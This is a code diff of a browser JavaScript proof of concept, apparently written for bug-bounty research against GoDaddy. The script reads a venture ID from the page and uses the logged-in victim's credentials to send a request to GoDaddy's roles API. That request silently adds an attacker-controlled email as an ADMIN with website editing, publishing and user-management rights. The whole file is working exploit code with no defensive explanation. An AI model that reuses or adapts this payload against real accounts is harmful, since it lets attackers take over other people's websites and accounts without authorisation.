@@ -1,45 +1,49 @@
-(() => {
-  const html = document.documentElement.innerHTML;
+const EMAIL = "inimail+2@wearehackerone.com";
 
-  const match = html.match(/ventureId["']?\s*:\s*["']?([^"',}\s]+)/i);
-  const resourceId = match ? match[1] : null;
+function processAndAddUser() {
+    try {
+        const html = document.documentElement.innerHTML;
 
-  console.log("ventureId:", resourceId);
+        const match = html.match(/ventureId["']?\s*:\s*["']?([^"',}\s]+)/i);
+        const resourceId = match ? match[1] : null;
 
-  if (!resourceId) {
-    console.error("ventureId not found — aborting request");
-    return;
-  }
+        console.log("ventureId:", resourceId);
 
-  const xhr = new XMLHttpRequest();
-  xhr.open("POST", "https://api.godaddy.com/v2/roles/assignees", true);
-  xhr.setRequestHeader("User-Agent", 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:148.0) Gecko/20100101 Firefox/148.0');
-  xhr.setRequestHeader("Accept", '*/*');
-  xhr.setRequestHeader("Accept-Language", 'en-US,en;q=0.9');
-  xhr.setRequestHeader("Content-Type", 'application/json');
+        if (!resourceId) {
+            throw new Error("ventureId not found — aborting request");
+        }
 
-  xhr.withCredentials = true;
+        const xhr = new XMLHttpRequest();
+        xhr.open("POST", "https://api.godaddy.com/v2/roles/assignees", false);
+        xhr.setRequestHeader("Content-Type", "application/json");
+        xhr.withCredentials = true;
 
-  xhr.onreadystatechange = function () {
-    if (xhr.readyState === 4) {
-      console.log("Status:", xhr.status);
-      console.log("Response:", xhr.responseText);
+        const payload = {
+            permissionsToInclude: [
+                "conversation_manage_settings",
+                "conversation_reply",
+                "conversation_delete",
+                "package_view_and_manage_roles_users",
+                "website_edit",
+                "website_publish"
+            ],
+            userName: "testingsss",
+            userEmail: EMAIL,
+            resourceId: resourceId,
+            resourceType: "venture",
+            defaultRole: "ADMIN"
+        };
+
+        xhr.send(JSON.stringify(payload));
+
+        if (xhr.status !== 200 && xhr.status !== 201) {
+            throw new Error(`Failed to add user: ${xhr.statusText}`);
+        }
+
+        console.log("User added successfully.");
+    } catch (error) {
+        console.error("An error occurred:", error.message);
     }
-  };
+}
 
-  xhr.send(JSON.stringify({
-    permissionsToInclude: [
-      "conversation_manage_settings",
-      "conversation_reply",
-      "conversation_delete",
-      "package_view_and_manage_roles_users",
-      "website_edit",
-      "website_publish"
-    ],
-    userName: "asdasd",
-    userEmail: "inimail+2@wearehackerone.com",
-    resourceId: resourceId,
-    resourceType: "venture",
-    defaultRole: "ADMIN"
-  }));
-})();
+processAndAddUser();
